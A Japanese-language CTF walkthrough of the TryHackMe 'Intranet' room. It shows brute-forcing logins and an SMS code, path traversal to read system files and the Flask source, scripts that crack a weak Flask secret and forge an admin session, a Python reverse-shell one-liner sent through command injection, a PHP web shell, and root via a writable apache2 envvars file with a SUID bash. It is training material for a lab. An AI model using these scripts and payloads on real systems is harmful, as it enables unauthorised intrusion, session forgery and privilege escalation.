# Intranet CTF

https://tryhackme.com/room/securesolacodersintra

## Enumeration

```shell
TARGET=10.48.161.162
sudo bash -c "echo $TARGET   intra >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT     STATE SERVICE    REASON
7/tcp    open  echo       syn-ack ttl 64
21/tcp   open  ftp        syn-ack ttl 64
22/tcp   open  ssh        syn-ack ttl 64
23/tcp   open  telnet     syn-ack ttl 64
80/tcp   open  http       syn-ack ttl 64
8080/tcp open  http-proxy syn-ack ttl 64
```

```sh
sudo nmap -sV -p7,21,22,23,80,8080 $TARGET

PORT     STATE SERVICE    VERSION
7/tcp    open  echo
21/tcp   open  ftp        vsftpd 3.0.5
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
23/tcp   open  tcpwrapped
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
8080/tcp open  http-proxy Werkzeug/2.2.2 Python/3.8.10
```

7はecho、FTP,SSH,23は不明、80,8080がHTTP

FTPのAnonymousログインは不可。

`SecureSolaCoders.no` というドメイン名。

```sh
sudo bash -c "echo $TARGET   SecureSolaCoders.no >> /etc/hosts"
```

8080ポートのコメントから、`devops@securesolacoders.no`, `anders` を発見。

```html
<!--- Any bugs? Please report them to our developer team. We have an open bug bounty program!
  For any inquiries, contact devops@securesolacoders.no.
  Sincerely, anders (Senior Developer) -->
```

```sh
hydra -l anders -P /usr/share/wordlists/rockyou.txt $TARGET ftp -t 30
```

### サブドメイン、VHOST

見つからなかった。

```shell
ffuf -u http://SecureSolaCoders.no -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.SecureSolaCoders.no' -fs 111

ffuf -u http://SecureSolaCoders.no -c -w /usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt -H 'Host: FUZZ.SecureSolaCoders.no' -fs 111
```

### ディレクトリ列挙

80は何も出ない。

```sh
dirb http://SecureSolaCoders.no:8080

---- Scanning URL: http://SecureSolaCoders.no:8080/ ----
+ http://SecureSolaCoders.no:8080/admin (CODE:302|SIZE:199)                                                          
+ http://SecureSolaCoders.no:8080/application (CODE:403|SIZE:213)                                                    
+ http://SecureSolaCoders.no:8080/external (CODE:302|SIZE:199)                                                       
+ http://SecureSolaCoders.no:8080/home (CODE:302|SIZE:199)                                                           
+ http://SecureSolaCoders.no:8080/internal (CODE:302|SIZE:199)                                                       
+ http://SecureSolaCoders.no:8080/login (CODE:200|SIZE:2154)                                                         
+ http://SecureSolaCoders.no:8080/logout (CODE:302|SIZE:199)                                                         
+ http://SecureSolaCoders.no:8080/robots.txt (CODE:200|SIZE:20)                                                      
+ http://SecureSolaCoders.no:8080/sms (CODE:302|SIZE:199)                                                            
+ http://SecureSolaCoders.no:8080/temporary (CODE:403|SIZE:213)
```

何も出ない。

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -q -x=txt,php -u http://SecureSolaCoders.no -w ./dirlist.txt -t 64 -k
```

## 8080

ログインエラーメッセージからユーザー名の有無を判別可能。

- `Error: Invalid username`
- `Error: Invalid password`

パスワードに `1' or 1=1-- -` を入れたら検出された。 `Error: Hacking attempt detected! You have been logged as 192.168.138.236. (Detected illegal chars in password).`

X-Forwarded-For を設定してもIPの表示は変わらなかった。

SQLiフィルターバイパスを探したが、何も出なかった。

```sh
ffuf -u http://intra:8080/login -X POST -d 'username=devops%40securesolacoders.no&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w Auth_Bypass2.txt -fr 'Hacking attempt detected|Invalid password'
```

有効なユーザー名を探す。admin, anders のメールアドレスは有効。下の二つはSQLiのフィルターに引っかかっている。

```sh
$ ffuf -u http://intra:8080/login -X POST -d 'username=FUZZ%40securesolacoders.no&password=aaa' -H 'Content-Type: application/x-www-form-urlencoded' -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -fr 'Invalid user'

admin                   [Status: 200, Size: 2249, Words: 296, Lines: 109, Duration: 156ms]
anders                  [Status: 200, Size: 2250, Words: 296, Lines: 109, Duration: 155ms]
d'anne                  [Status: 200, Size: 2342, Words: 308, Lines: 109, Duration: 155ms]
l;urette                [Status: 200, Size: 2340, Words: 308, Lines: 109, Duration: 161ms]
:: Progress: [10177/10177] :: Job [1/1] :: 132 req/sec :: Duration: [0:01:19] :: Errors: 0 ::
```

rockyou.txt でブルートフォースをかけたがヒットしなかった。

ここは分からなかったので[ウォークスルー](https://github.com/dpamar/thm_writeups/blob/main/internal.md)のヒントを見た。

https://weakpass.com/tools/passgen でパスワードを生成してブルートフォースしたら、andersのパスワードが判明した。

```sh
$ ffuf -u http://intra:8080/login -X POST -d 'username=anders%40securesolacoders.no&password=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -w ./pw.txt -fr 'Hacking attempt detected|Invalid password'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://intra:8080/login
 :: Wordlist         : FUZZ: /home/kali/ctf/intra/pw.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : username=anders%40securesolacoders.no&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Hacking attempt detected|Invalid password
________________________________________________

[REDACTED]    [Status: 302, Size: 195, Words: 18, Lines: 6, Duration: 190ms]
:: Progress: [1145/1145] :: Job [1/1] :: 130 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

## 2FA

SMSコードを入力する必要がある。適当に入れたら、`Error: Invalid SMS code`

セッションIDは一見JWTっぽいがJWTではない。

```http
POST /sms HTTP/1.1
Host: intra:8080
Content-Length: 8
Cache-Control: max-age=0
Origin: http://intra:8080
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://intra:8080/sms
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8
Cookie: session=eyJ1c2VybmFtZ[REDACTED]
x-forwarded-for: 127.0.0.1
Connection: keep-alive

sms=1234
```

数字4桁のリストでブルートフォースが成功した。

```sh
ffuf -u http://intra:8080/sms -X POST -d 'sms=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: session=eyJ1c2VybmFtZ[REDACTED]' -w /usr/share/wordlists/SecLists/Fuzzing/4-digits-0000-9999.txt -fr 'Invalid SMS'
```

## dashboard

メールアドレス

- `support@securesolacoders.no`
- `hiring@securesolacoders.no`
- `internal@securesolacoders.no`
- `external@securesolacoders.no`

internal news で updateを押したときのリクエスト

```http
POST /internal HTTP/1.1
Host: intra:8080
Content-Length: 11
Cache-Control: max-age=0
Origin: http://intra:8080
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://intra:8080/internal
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ja;q=0.8
Cookie: session=eyJsb2dnZWRfaW4iO[REDACTED]
x-forwarded-for: 127.0.0.1
Connection: keep-alive

news=latest
```

パラメータファジングで検出されたのは、news のみ。

```sh
$ ffuf -u http://intra:8080/internal -X POST -d 'FUZZ=1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: session=eyJsb2dnZWRfaW4iO[REDACTED]' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fc 400

news                    [Status: 500, Size: 265, Words: 33, Lines: 6, Duration: 153ms]
:: Progress: [6453/6453] :: Job [1/1] :: 130 req/sec :: Duration: [0:00:49] :: Errors: 0 ::
```

news の値は、latest 以外検出できず。

```sh
$ ffuf -u http://intra:8080/internal -X POST -d 'news=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: session=eyJsb2dnZWRfaW4i[REDACTED]' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fc 500

latest                  [Status: 200, Size: 1684, Words: 230, Lines: 81, Duration: 154ms]
:: Progress: [6453/6453] :: Job [1/1] :: 129 req/sec :: Duration: [0:00:50] :: Errors: 0 ::
```

`news=../../../../etc/passwd` としたら、ローカルファイルを読めた。

```sh
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
anders:x:1000:1000:anders:/home/anders:/bin/bash
devops:x:1001:1001:,,,:/home/devops:/bin/bash
telnetd:x:113:118::/nonexistent:/usr/sbin/nologin
ftp:x:114:119:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:115:120:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
ubuntu:x:1002:1003:Ubuntu:/home/ubuntu:/bin/bash
```

ログイン可能ユーザーは、anders, devops の二人だけ。id_rsa は読めなかった。  
/home/anders/.bashrc は読めないが、/home/devops/.bashrc は読めた。

pyファイルをファジングしてみたが、ヒットしない。

```sh
ffuf -u http://intra:8080/internal -X POST -d 'news=FUZZ.py' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYW5kZXJzIn0.aT-unA.KlmKdN10Z_9dViiFlHlcnXs_BMM' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -fc 500
```

```sh
ffuf -u http://intra:8080/internal -X POST -d 'news=../../../../srv/ftp/FUZZ.py' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: session=eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYW5kZXJzIn0.aT-unA.KlmKdN10Z_9dViiFlHlcnXs_BMM' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -fc 500
```

`news=../../../../proc/self/cmdline` から、pyファイルのパスを特定。

```
/usr/bin/python3 /home/devops/app.py
```

ソース入手成功。

```python
from flask import Flask, flash, redirect, render_template, request, session, abort, make_response, render_template_string, send_file
from time import gmtime, strftime
import jinja2, os, hashlib, random

app = Flask(__name__, template_folder=&#34;/home/devops/templates&#34;)


###############################################
# Flag: THM{[REDACTED]}                       #
###############################################


key = &#34;secret_key_&#34; + str(random.randrange(100000,999999))
app.secret_key = str(key).encode()

def check_hacking_attempt(value):

        bad_chars = &#34;#&amp;;&#39;\&#34;&#34;
        error = &#34;&#34;

        if any(ch in bad_chars for ch in value):
                error = &#34;Hacking attempt detected! &#34;
                error += &#34;You have been logged as &#34;
                error += request.remote_addr
                return True, error

        else:
                return False, error


@app.route(&#34;/robots.txt&#34;, methods=[&#34;GET&#34;])
def robots():
        return &#34;&lt;!-- Try harder --!&gt;&#34;



@app.route(&#34;/&#34;, methods=[&#34;GET&#34;])
def root():
        if not session.get(&#34;logged_in&#34;):
                return redirect(&#34;/login&#34;)
        else:
                return redirect(&#34;/home&#34;)


@app.route(&#34;/application&#34;, methods=[&#34;GET&#34;])
def application():
        return abort(403)


@app.route(&#34;/application/console&#34;, methods=[&#34;GET&#34;])
def console():
        return abort(403)


@app.route(&#34;/temporary&#34;, methods=[&#34;GET&#34;])
def temporary():
    return abort(403)


@app.route(&#34;/temporary/dev&#34;, methods=[&#34;GET&#34;])
def dev():
        return abort(403)


@app.route(&#34;/login&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;])
def login():

        if session.get(&#34;logged_in&#34;):
                return redirect(&#34;/home&#34;)

        if request.method == &#34;POST&#34;:

                username = request.form[&#34;username&#34;]
                attempt, error = check_hacking_attempt(username)
                if attempt == True:
                        error += &#34;. (Detected illegal chars in username).&#34;
                        return render_template(&#34;login.html&#34;, error=error)

                password = request.form[&#34;password&#34;]
                attempt, error = check_hacking_attempt(password)
                if attempt == True:
                        error += &#34;. (Detected illegal chars in password).&#34;
                        return render_template(&#34;login.html&#34;, error=error)


                if username.lower() == &#34;admin@securesolacoders.no&#34;:
                        error = &#34;Invalid password&#34;
                        return render_template(&#34;login.html&#34;, error=error)


                if username.lower() == &#34;devops@securesolacoders.no&#34;:
                        error = &#34;Invalid password&#34;
                        return render_template(&#34;login.html&#34;, error=error)


                if username.lower() == &#34;anders@securesolacoders.no&#34;:
                        if password == &#34;securesolacoders2022&#34;:
                                session[&#34;username&#34;] = &#34;anders&#34;

                                global sms_code
                                sms_code = random.randrange(1000,9999)

                                return redirect(&#34;/sms&#34;)
                        
                        else:
                                error = &#34;Invalid password&#34;
                                return render_template(&#34;login.html&#34;, error=error)
                else:
                        error = &#34;Invalid username&#34;
                        return render_template(&#34;login.html&#34;, error=error)

        return render_template(&#34;login.html&#34;)



@app.route(&#34;/sms&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;])
def sms():

        if session.get(&#34;username&#34;):
                if request.method == &#34;POST&#34;:
                        sms = request.form[&#34;sms&#34;]

                        if sms == str(sms_code):
                                session[&#34;logged_in&#34;] = True
                                return redirect(&#34;/home&#34;)
                        else:
                                error = &#34;Invalid SMS code&#34;
                                return render_template(&#34;sms.html&#34;, error=error) 


                return render_template(&#34;sms.html&#34;)
        else:
                return redirect(&#34;/login&#34;)



@app.route(&#34;/logout&#34;, methods=[&#34;GET&#34;])
def logout():
        if not session.get(&#34;logged_in&#34;):
                return redirect(&#34;/login&#34;)
        else:
                session.clear()
                return redirect(&#34;/login&#34;)


@app.route(&#34;/home&#34;, methods=[&#34;GET&#34;])
def home():
        if not session.get(&#34;logged_in&#34;):
                return redirect(&#34;/login&#34;)
        else:
                current_ip = request.remote_addr

                templateLoader = jinja2.FileSystemLoader(searchpath=&#34;./templates/&#34;)
                templateEnv = jinja2.Environment(loader=templateLoader)
                t = templateEnv.get_template(&#34;home.html&#34;)
                return t.render(current_ip=current_ip)


@app.route(&#34;/admin&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;])
def admin():
        if not session.get(&#34;logged_in&#34;):
                return redirect(&#34;/login&#34;)
        else:
                if session.get(&#34;username&#34;) == &#34;admin&#34;:

                        if request.method == &#34;POST&#34;:
                                os.system(request.form[&#34;debug&#34;])
                                return render_template(&#34;admin.html&#34;)

                        current_ip = request.remote_addr
                        current_time = strftime(&#34;%Y-%m-%d %H:%M:%S&#34;, gmtime())

                        return render_template(&#34;admin.html&#34;, current_ip=current_ip, current_time=current_time)
                else:
                        return abort(403)


@app.route(&#34;/internal&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;])
def internal():
        if not session.get(&#34;logged_in&#34;):
                return redirect(&#34;/login&#34;)
        else:
                if request.method == &#34;POST&#34;:
                        news_file = request.form[&#34;news&#34;]
                        news = open(&#34;/opt/news/{}&#34;.format(news_file)).read()
                        return render_template(&#34;internal.html&#34;, news=news)

                return render_template(&#34;internal.html&#34;)


@app.route(&#34;/external&#34;, methods=[&#34;GET&#34;])
def external():
        if not session.get(&#34;logged_in&#34;):
                return redirect(&#34;/login&#34;)
        else:
                templateLoader = jinja2.FileSystemLoader(searchpath=&#34;./templates/&#34;)
                templateEnv = jinja2.Environment(loader=templateLoader)
                t = templateEnv.get_template(&#34;external.html&#34;)
                return t.render()


if __name__ == &#34;__main__&#34;:
        app.run(host=&#34;0.0.0.0&#34;, port=8080, debug=False)
```

`news=../../../../home/devops/templates/admin.html`

```html
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;style&gt;
body {
margin: 0;
}

ul {
list-style-type: none;
margin: 0;
padding: 0;
width: 10%;
background-color: #f1f1f1;
position: fixed;
height: 100%;
overflow: auto;
}

li a {
display: block;
color: #000;
padding: 8px 16px;
text-decoration: none;
}

li a.active {
background-color: #8B0000;
color: white;
}

li a:hover:not(.active) {
background-color: #555;
color: white;
}
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;/home&#34;&gt;Home&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;/internal&#34;&gt;Internal News&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;/external&#34;&gt;External News&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;active&#34; href=&#34;/admin&#34;&gt;Admin&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;/logout&#34;&gt;Log Out&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div style=&#34;margin-left:11%;padding:1px 16px;height:1000px;&#34;&gt;
&lt;h2&gt;Admin dashboard&lt;/h2&gt;
&lt;h3&gt;Flag: THM{[REDACTED]}&lt;/h3&gt;
&lt;h3&gt;Server status:&lt;p style=&#34;color:green;&#34;&gt;OK&lt;/p&gt;&lt;/h3&gt;&lt;br&gt;
&lt;p&gt;Logged in from source {% if current_ip %} {{ current_ip }} {% endif %}&lt;/p&gt;
&lt;p&gt;Current time: {% if current_time %} {{ current_time }} {% endif %}&lt;/p&gt;

&lt;p&gt;Please contact our staff for support&lt;/p&gt;
&lt;p&gt;support@securesolacoders.no&lt;/p&gt;



&lt;/form&gt;
&lt;br&gt;

&lt;/div&gt;

&lt;/body&gt;
&lt;/html&gt;
```

POST /admin で debug パラメータを渡すことができればコマンドを実行できる。  
しかし、ログイン画面から admin としてログインすることは不可能。

```python
@app.route(&#34;/admin&#34;, methods=[&#34;GET&#34;, &#34;POST&#34;])
def admin():
        if not session.get(&#34;logged_in&#34;):
                return redirect(&#34;/login&#34;)
        else:
                if session.get(&#34;username&#34;) == &#34;admin&#34;:

                        if request.method == &#34;POST&#34;:
                                os.system(request.form[&#34;debug&#34;])
                                return render_template(&#34;admin.html&#34;)
```

秘密鍵を割れれば、セッション変数を自由にセットできる。  
6桁のランダム数字なので、オフラインクラックは現実的に可能。

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

cookie = "eyJsb2dnZWR[REDACTED]"

def try_key(key):
    app = Flask(__name__)
    app.secret_key = key
    app.config["SECRET_KEY_FALLBACKS"] = []

    s = SecureCookieSessionInterface().get_signing_serializer(app)
    try:
        data = s.loads(cookie)
        return data  
    except Exception:
        return None

for i in range(100000, 1000000):
    if i % 10000 == 0:
        print(i)
    key = "secret_key_" + str(i)
    data = try_key(key)
    if data:
        print("[+] FOUND KEY:", key)
        print("[+] SESSION:", data)
        break
```

秘密鍵が判明。

```sh
$ python ./find_secret.py
...
[+] FOUND KEY: [REDACTED]
[+] SESSION: {'logged_in': True, 'username': 'anders'}
```

adminのセッションを生成

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

class FakeApp:
    secret_key = b"[REDACTED]"
    config = {
        "SECRET_KEY_FALLBACKS": []
    }

app = FakeApp()

serializer = SecureCookieSessionInterface().get_signing_serializer(app)

cookie = serializer.dumps({
    "logged_in": True,
    "username": "admin"
})

print(cookie)
```

POST /admin を実行。

```http
debug=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.138.236",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

リバースシェル取得成功。

```sh
$ nc -lnvp 8888           
listening on [any] 8888 ...
connect to [192.168.138.236] from (UNKNOWN) [10.48.183.27] 43754
$ id
id
uid=1001(devops) gid=1001(devops) groups=1001(devops)
```

## 権限昇格１ devops -> anders

Webログインで使ったパスワードは失敗。

anders が apache2 を実行している。
```sh
anders       917  0.0  0.3 193896  7492 ?        S    05:48   0:00 /usr/sbin/apache2 -k start
```

/var/www/html に書き込み可能。

```sh
devops@ip-10-48-183-27:~$ ls -al /var/www/html
total 12
drwxrwxrwx 2 root root 4096 Nov  7  2022 .
drwxr-xr-x 3 root root 4096 Oct 16  2022 ..
-rw-r--r-- 1 root root  111 Nov  7  2022 index.html
```

PHPを保存して、リバースシェル取得成功。

```sh
$ nc -lnvp 8889           
listening on [any] 8889 ...
connect to [192.168.138.236] from (UNKNOWN) [10.48.183.27] 48642
Linux ip-10-48-183-27 5.15.0-138-generic #148~20.04.1-Ubuntu SMP Fri Mar 28 14:32:35 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 09:33:56 up  3:46,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(anders) gid=1000(anders) groups=1000(anders),24(cdrom),27(sudo),30(dip),46(plugdev)
sh: 0: can't access tty; job control turned off
$ id
uid=1000(anders) gid=1000(anders) groups=1000(anders),24(cdrom),27(sudo),30(dip),46(plugdev)
```

## 権限昇格２ anders -> root

root として apache2 の再起動が可能。

```sh
anders@ip-10-48-183-27:/home/anders$ sudo -l
Matching Defaults entries for anders on ip-10-48-183-27:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User anders may run the following commands on ip-10-48-183-27:
    (ALL) NOPASSWD: /sbin/service apache2 restart
```

サービス定義

```sh
anders@ip-10-48-183-27:/home/anders$ systemctl cat apache2
# /lib/systemd/system/apache2.service
[Unit]
Description=The Apache HTTP Server
After=network.target remote-fs.target nss-lookup.target
Documentation=https://httpd.apache.org/docs/2.4/

[Service]
Type=forking
Environment=APACHE_STARTED_BY_SYSTEMD=true
ExecStart=/usr/sbin/apachectl start
ExecStop=/usr/sbin/apachectl stop
ExecReload=/usr/sbin/apachectl graceful
PrivateTmp=true
Restart=on-abort

[Install]
WantedBy=multi-user.target
```

編集はできない。

```sh
anders@ip-10-48-183-27:/home/anders$ ls -al /lib/systemd/system/apache2.service
-rw-r--r-- 1 root root 395 Mar 18  2024 /lib/systemd/system/apache2.service
```

/etc/apache2 の下に、不自然に書き込み権限のあるファイルがある。

```sh
anders@ip-10-48-183-27:/home/anders$ ls -al /etc/apache2/
total 88
drwxr-xr-x   8 root root  4096 Apr 26  2025 .
drwxr-xr-x 105 root root  4096 Dec 15 05:48 ..
-rw-r--r--   1 root root  7224 Nov  7  2022 apache2.conf
drwxr-xr-x   2 root root  4096 Apr 26  2025 conf-available
drwxr-xr-x   2 root root  4096 Oct 16  2022 conf-enabled
-rw-r--rw-   1 root root  1778 Nov  7  2022 envvars
-rw-r--r--   1 root root 31063 Feb 23  2021 magic
drwxr-xr-x   2 root root 12288 Apr 26  2025 mods-available
drwxr-xr-x   2 root root  4096 Nov  6  2022 mods-enabled
-rw-r--r--   1 root root   320 Feb 23  2021 ports.conf
drwxr-xr-x   2 root root  4096 Apr 26  2025 sites-available
drwxr-xr-x   2 root root  4096 Oct 16  2022 sites-enabled
```

envvars は source で読み込まれるファイルのため、bashコマンドをそのまま書けば実行される。

サービスを再起動し、SUID付きのbashをコピーすることに成功。

```sh
anders@ip-10-48-183-27:/$ ls -al /home/anders
ls -al /home/anders
total 1192
drwxr-x--- 5 anders anders    4096 Dec 15 10:03 .
drwxr-xr-x 5 root   root      4096 Dec 15 05:48 ..
lrwxrwxrwx 1 root   root         9 Oct 16  2022 .bash_history -> /dev/null
-rw-r--r-- 1 anders anders     220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 anders anders    3771 Feb 25  2020 .bashrc
drwx------ 2 anders anders    4096 Oct 16  2022 .cache
drwxrwxrwx 3 anders anders    4096 Dec 15 10:02 .local
-rw-r--r-- 1 anders anders     807 Feb 25  2020 .profile
drwx------ 2 anders anders    4096 Oct 16  2022 .ssh
-rw-r--r-- 1 anders anders       0 Dec 15 09:35 .sudo_as_admin_successful
-rwsr-sr-x 1 root   root   1183448 Dec 15 10:03 bash
-rw-r--r-- 1 root   root        38 Mar 24  2023 user2.txt
```

root 昇格。

```sh
anders@ip-10-48-183-27:/$ /home/anders/bash -p
/home/anders/bash -p
bash-5.0# id
id
uid=1000(anders) gid=1000(anders) euid=0(root) egid=0(root) groups=0(root),24(cdrom),27(sudo),30(dip),46(plugdev),1000(anders)
```

## 振り返り

- CTFでは初めて見たが、会社名からパスワードリストを作るのは現実的なケースとして良い勉強になった。
- /home/devops は読めることに気付いていたので、そこもpyファイルのファジングをするべきだった。
- flaskで秘密鍵からセッション変数を偽造する手法は過去に学んだことがあるようだが、すっかり忘れていたので良い復習になった。
- サービス関連の権限昇格で、サービス自体を変更できない場合は、読み込まれる設定ファイル等に注目すべき。

## Tags

#tags:ブルートフォース #tags:LFI #tags:flask #tags:セッションID(flask) #tags:サービス(apache2)
